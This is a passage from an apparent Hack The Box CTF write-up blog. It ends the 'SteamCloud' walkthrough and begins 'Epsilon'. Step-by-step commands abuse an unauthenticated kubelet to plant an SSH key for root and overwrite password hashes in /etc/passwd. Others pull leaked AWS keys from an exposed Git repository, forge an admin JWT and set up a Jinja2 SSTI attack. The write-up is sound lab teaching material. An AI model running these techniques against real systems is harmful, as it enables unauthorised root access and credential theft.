lrwxrwxrwx 1 root root 31 initrd.img - boot/initrd.img-4.19.0-18-amd64 lrwxrwxrwx 1 root root 31 initrd.img.old - boot/initrd.img-4.19.0-14-amd64 lrwxrwxrwx 1 root root 7 lib - usr/lib lrwxrwxrwx 1 root root 9 lib32 - usr/lib32 lrwxrwxrwx 1 root root 9 lib64 - usr/lib64 lrwxrwxrwx 1 root root 10 libx32 - usr/libx32 drwx------ 2 root root 16384 lost+found drwxr-xr-x 3 root root 4096 media drwxr-xr-x 2 root root 4096 mnt drwxr-xr-x 5 root root 4096 opt dr-xr-xr-x 210 root root 0 proc drwx------ 4 root root 4096 root drwxr-xr-x 20 root root 620 run lrwxrwxrwx 1 root root 8 sbin - usr/sbin drwxr-xr-x 2 root root 4096 srv dr-xr-xr-x 13 root root 0 sys drwxrwxrwt 10 root root 4096 tmp drwxr-xr-x 14 root root 4096 usr drwxr-xr-x 11 root root 4096 var lrwxrwxrwx 1 root root 28 vmlinuz - boot/vmlinuz-4.19.0-18-amd64 lrwxrwxrwx 1 root root 28 vmlinuz.old - boot/vmlinuz-4.19.0-14-amd64  We see that it is the file system of the machine:\n$ ./kubeletctl run 'cat /var/log/host/etc/hostname' --namespace default --pod escaper --container escaper --server 10.10.11.133 steamcloud  And thus, we can read the root.txt flag:\n$ ./kubeletctl run 'ls -la --time-style=%2b /var/log/host/root' --namespace default --pod escaper --container escaper --server 10.10.11.133 total 28 drwx------ 4 root root 4096 . drwxr-xr-x 18 root root 4096 .. lrwxrwxrwx 1 root root 9 .bash_history - /dev/null -rw-r--r-- 1 root root 570 .bashrc drwxr-x--- 3 root root 4096 .kube drwxr-xr-x 10 root root 4096 .minikube -rw-r--r-- 1 root root 148 .profile -rw-r--r-- 1 root root 33 root.txt $ ./kubeletctl run 'cat /var/log/host/root/root.txt' --namespace default --pod escaper --container escaper --server 10.10.11.133 61f3bca8afe7785058a1be1972592526  Obtaining a shell as root I found two ways to get a shell as root:\n Add an SSH public key into /root/.ssh/authorized_keys. Modify passwords for user and root inside /etc/passwd.  For both methods, we must take into account that we cannot run commands using special characters such as quotes (', \u0026quot;), pipes (|), redirections (\u0026gt;, \u0026gt;\u0026gt;, \u0026lt;, \u0026lt;\u0026lt;\u0026lt;) or output execution ($(...), `...`) because of the way we have RCE.\nFortunately, we can use sed to replace strings inside a file, and we can omit quotes if our substitution does not contain spaces or any of the special characters above.\nMy initial idea was to copy /etc/hosts (inside the volume mount) and modify it:\n$ ./kubeletctl run 'cp /var/log/host/etc/hosts /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 127.0.0.1 localhost 127.0.1.1 steamcloud # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 127.0.0.1 host.minikube.internal 10.10.11.133 control-plane.minikube.internal  Now we can start removing lines of the file:\n$ ./kubeletctl run 'sed -i s/f.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'sed -i s/:.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'sed -i s/127.*//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 # The 10.10.11.133 control-plane.minikube.internal  At this point, to remove the first line, we must use ..The to match it using RegEx, because # is a special character:\n$ ./kubeletctl run 'sed -i s/..The//g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 10.10.11.133 control-plane.minikube.internal  Now we can modify 10.10.11.133 by ssh-rsa and control-plane.minikube.internal by the public key:\n$ ./kubeletctl run 'sed -i s/10.10.11.133/ssh-rsa/g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 ssh-rsa control-plane.minikube.internal  We can generate a pair of SSH keys using ssh-keygen:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:7aEfZ2kv6cZXqHKtyYKPtuPW7CTkAl4OqLYkkXd9ehY The key's randomart image is: +---[RSA 3072]----+ | | | | | | | . . . . | |o o + o E o . | | + o = = + . .. .| |oo . + *++.=+ . | |+ . +===*Boo | | . ++=+*=+. | +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  In order to copy this key, we must encode the + (%2b) and the = (%3d) using URL encoding because of the nature of the RCE we have. Furthermore, all slashes must be escaped because sed also uses slashes to distinguish the old and new strings. We can also encode / (%2f) just in case:\n$ cat id_rsa.pub | sed 's/+/%2b/g' | sed 's/\\//\\\\%2f/g' | sed 's/=/%3d/g' ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\\%2fqIqQy9xVwwl2KJ3df\\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d $ ./kubeletctl run 'sed -i s/control-plane.minikube.internalAAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\\%2fqIqQy9xVwwl2KJ3df\\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d/g /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133  Now that we have finished the string replacements we obtain a file that is valid as authorized_keys:\n$ ./kubeletctl run 'cat /var/log/host/tmp/asdf' --namespace default --pod escaper --container escaper --server 10.10.11.133 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  Then we create a directory called .ssh and add this file as authorized_keys:\n$ ./kubeletctl run 'mkdir /var/log/host/root/.ssh' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cp /var/log/host/tmp/asdf /var/log/host/root/.ssh/authorized_keys' --namespace default --pod escaper --container escaper --server 10.10.11.133  And we have a shell as root:\n$ ssh -i id_rsa root@10.10.11.133 root@steamcloud:~# cat root.txt 61f3bca8afe7785058a1be1972592526  The second method is a bit simpler. We have this /etc/passwd file:\n$ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:x:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  We need to modify the password for user in order to access via SSH (I tried first with root but it did not work, maybe SSH using password is disabled).\nFor this purpose, we can use sed again avoiding quotation marks and special characters. The password that we are going to set is asdf in DES Unix format:\n$ openssl passwd asdf J8Ufwh9mVJ3VI  $ ./kubeletctl run 'sed -i s/user:x/user:J8Ufwh9mVJ3VI/g /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:J8Ufwh9mVJ3VI:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  We observe that the password is set. Now we can enter using SSH:\n$ ssh user@10.10.11.133 user@10.10.11.133's password: user@steamcloud:~$ id uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)  We cannot run sudo but we can change the password for root:\n$ ./kubeletctl run 'sed -i s/root:x/root:J8Ufwh9mVJ3VI/g /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 $ ./kubeletctl run 'cat /var/log/host/etc/passwd' --namespace default --pod escaper --container escaper --server 10.10.11.133 root:J8Ufwh9mVJ3VI:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin user:J8Ufwh9mVJ3VI:1000:1000:user,,,:/home/user:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  Now we simply add asdf as password and we are root:\nuser@steamcloud:~$ su root Password: root@steamcloud:/home/user# cat /root/root.txt 61f3bca8afe7785058a1be1972592526  ","image":"/images/HTB/SteamCloud/SteamCloud.png","permalink":"https://7rocky.github.io/en/htb/steamcloud/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a Kubernetes cluster that exposes the kubelet and it is vulnerable to unauthenticated RCE. We are able to extract credentials from a running Pod and use them to create a malicious Pod that mounts the hosts file system. Basic knowledge about pentesting on Kubernetes is needed to compromise this machine","time":13,"title":"SteamCloud"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.134   Release: 07 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.134 -p 22,80,5000 Nmap scan report for 10.10.11.134 Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-git: | 10.10.11.134:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: Updating Tracking API # Please enter the commit message for... |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: 403 Forbidden 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Costume Shop Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.86 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 5000 (HTTP) open.\nWeb enumeration There is a website on port 5000. It looks like this:\nWe can enumerate more routes but we cannot access them because we do not have valid credentials yet:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.134:5000/FUZZ home [Status: 302, Size: 208, Words: 21, Lines: 4] order [Status: 302, Size: 208, Words: 21, Lines: 4] track [Status: 200, Size: 4288, Words: 631, Lines: 234] [Status: 200, Size: 3550, Words: 522, Lines: 205]  Git repository enumeration The output of nmap unveiled that there is a Git repository exposed on port 80.\nWe may use some tool like git-dumper, but this time I used gitdumper.sh from GitTools:\n$ bash gitdumper.sh http://10.10.11.134/.git/ ./epsilon_git ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating ./epsilon/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [+] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [-] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [+] Downloaded: logs/refs/heads/master [-] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [-] Downloaded: /refs/wip/index/refs/heads/master [-] Downloaded: /refs/wip/wtree/refs/heads/master [+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 [-] Downloaded: objects/00/00000000000000000000000000000000000000 [+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 [+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1 [+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d [+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 [+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02 [+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 [+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca [+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 [+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d [+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e [+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 [+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca [+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34  Now we should have a .git directory inside epsilon_git:\n$ cd epsilon_git $ ls -a . .. .git  At this point we can extract the current code of the main branch using:\n$ git checkout . $ ls server.py track_api_CR_148.py  The file server.py contains a simple Flask application that corresponds to the website on port 5000:\n#!/usr/bin/python3 import jwt from flask import * app = Flask(__name__) secret = '\u0026lt;secret_key\u0026gt;' def verify_jwt(token, key): try: username = jwt.decode(token, key, algorithms=['HS256'])['username'] if username: return True else: return False except: return False @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': if request.form['username'] == 'admin' and request.form['password'] == 'admin': res = make_response() username = request.form['username'] token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256') res.set_cookie('auth', token) res.headers['location'] = '/home' return res, 302 else: return render_template('index.html') else: return render_template('index.html') @app.route('/home') def home(): if verify_jwt(request.cookies.get('auth'), secret): return render_template('home.html') else: return redirect('/', code=302) @app.route('/track', methods=['GET', 'POST']) def track(): if request.method == 'POST': if verify_jwt(request.cookies.get('auth'), secret): return render_template('track.html', message=True) else: return redirect('/', code=302) else: return render_template('track.html') @app.route('/order', methods=['GET', 'POST']) def order(): if verify_jwt(request.cookies.get('auth'), secret): if request.method == 'POST': costume = request.form['costume'] message = ''' Your order of '{}' has been placed successfully. '''.format(costume) tmpl = render_template_string(message, costume=costume) return render_template('order.html', message=tmpl) else: return render_template('order.html') else: return redirect('/', code=302) app.run(debug='true')  We see it is using some hard-coded credentials (admin:admin). However, they do not work. It seems that we will need to craft a JWT (JSON Web Token) token to access the website, but we do not have the secret key.\nMoreover, we observe that there is a Server-Side Template Injection (SSTI) vulnerability in /order, because we can send costume as a body parameter and it is inserted into a text that will be directly rendered by Jinja2 (the default template engine for Flask), without any validation.\nThe file called track_api_CR_148.py contains some stuff for Amazon Web Services (particularly, AWS Lambda):\nimport io import os from zipfile import ZipFile from boto3.session import Session session = Session( aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', endpoint_url='http://cloud.epsilon.htb') aws_lambda = session.client('lambda') def files_to_zip(path): for root, dirs, files in os.walk(path): for f in files: full_path = os.path.join(root, f) archive_name = full_path[len(path) + len(os.sep):] yield full_path, archive_name def make_zip_file_bytes(path): buf = io.BytesIO() with ZipFile(buf, 'w') as z: for full_path, archive_name in files_to_zip(path=path): z.write(full_path, archive_name) return buf.getvalue() def update_lambda(lambda_name, lambda_code_path): if not os.path.isdir(lambda_code_path): raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path)) aws_lambda.update_function_code( FunctionName=lambda_name, ZipFile=make_zip_file_bytes(path=lambda_code_path))  Again, there are two keys that are not present in the code in order to configure AWS Lambda.\nHowever, we have the Git repository. Maybe we can find previous commits:\n$ git log commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -\u0026gt; master) Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 17:41:07 2021 +0000 Fixed Typo commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:02:59 2021 +0000 Adding Costume Site commit c51441640fd25e9fba42725147595b5918eba0f1 Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:00:58 2021 +0000 Updatig Tracking API commit 7cf92a7a09e523c1c667d13847c9ba22464412f3 Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:00:28 2021 +0000 Adding Tracking API Module  Let\u0026rsquo;s see some differences using the commit identifiers (adding just the beginning of the hash is enough):\n$ git diff b10dd06 c622771 diff --git a/track_api_CR_148.py b/track_api_CR_148.py index 545f6fe..8d3b52e 100644 --- a/track_api_CR_148.py +++ b/track_api_CR_148.py @@ -8,8 +8,8 @@ session = Session( aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', - endpoint_url='http://cloud.epsilong.htb') -aws_lambda = session.client('lambda') + endpoint_url='http://cloud.epsilon.htb') +aws_lambda = session.client('lambda')  Ok, this is just a typo, altough we can put cloud.epsilon.htb into /etc/hosts. Here is a more interesting difference:\n$ git diff 7cf92a c514416 diff --git a/track_api_CR_148.py b/track_api_CR_148.py index fed7ab9..545f6fe 100644 --- a/track_api_CR_148.py +++ b/track_api_CR_148.py @@ -5,8 +5,8 @@ from boto3.session import Session session = Session( - aws_access_key_id='AQLA5M37BDN6FJP76TDC', - aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A', + aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', + aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', endpoint_url='http://cloud.epsilong.htb') aws_lambda = session.client('lambda')  And here we have some hard-coded secrets to setup AWS Lambda. Using this, we can configure AWS CLI to interact with AWS Lambda and download the code for the function:\n$ aws configure AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A Default region name [None]: us-east-1 Default output format [None]:  Then, we can list the functions that are deployed for cloud.epsilon.htb:\n$ aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions { \"Functions\": [ { \"FunctionName\": \"costume_shop_v1\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\", \"Runtime\": \"python3.7\", \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\", \"Handler\": \"my-function.handler\", \"CodeSize\": 478, \"Description\": \"\", \"Timeout\": 3, \"LastModified\": \"2022-02-14T23:01:58.240+0000\", \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\", \"Version\": \"$LATEST\", \"VpcConfig\": {}, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"d54a4387-53bc-49c5-a55c-c3bc5c8aed47\", \"State\": \"Active\", \"LastUpdateStatus\": \"Successful\", \"PackageType\": \"Zip\" } ] }  We see that costume_shop_v1 is the only function. Let\u0026rsquo;s examine it:\n$ aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name costume_shop_v1 { \"Configuration\": { \"FunctionName\": \"costume_shop_v1\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\", \"Runtime\": \"python3.7\", \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\", \"Handler\": \"my-function.handler\", \"CodeSize\": 478, \"Description\": \"\", \"Timeout\": 3, \"LastModified\": \"2022-02-11T05:29:01.295+0000\", \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\", \"Version\": \"$LATEST\", \"VpcConfig\": {}, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"bf23b664-e576-4493-8578-9906b999b8cc\", \"State\": \"Active\", \"LastUpdateStatus\": \"Successful\", \"PackageType\": \"Zip\" }, \"Code\": { \"Location\": \"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code\" }, \"Tags\": {} }  The code is availbable at a given URL, in a ZIP file:\n$ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code $ file code code: Zip archive data, at least v2.0 to extract, compression method=deflate $ unzip code Archive: code inflating: lambda_function.py  This is the source code for the deployed AWS Lambda function:\nimport json secret = 'RrXCv`mrNe!K!4+5`wYq' # apigateway authorization for CR-124 '''Beta release for tracking''' def lambda_handler(event, context): try: id = event['queryStringParameters']['order_id'] if id: return { 'statusCode': 200, 'body': json.dumps(str(resp)) # dynamodb tracking for CR-342 } else: return { 'statusCode': 500, 'body': json.dumps('Invalid Order ID') } except: return { 'statusCode': 500, 'body': json.dumps('Invalid Order ID') }  And here we have the secret for the JWT implementation.\nFoothold on the machine Now we are able to craft a valid JWT token as follows:\n\u0026gt;\u0026gt;\u0026gt; import jwt \u0026gt;\u0026gt;\u0026gt; jwt.encode({'username': 'admin'}, 'RrXCv`mrNe!K!4+5`wYq', algorithm='HS256') 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'  We can use this token as a cookie named auth to access to some more pages in the website:\nHowever, we found an SSTI attack vector in /order, so let\u0026rsquo;s exploit it.\nFirst of all, we must test that the SSTI works using a simple payload:\n$ curl 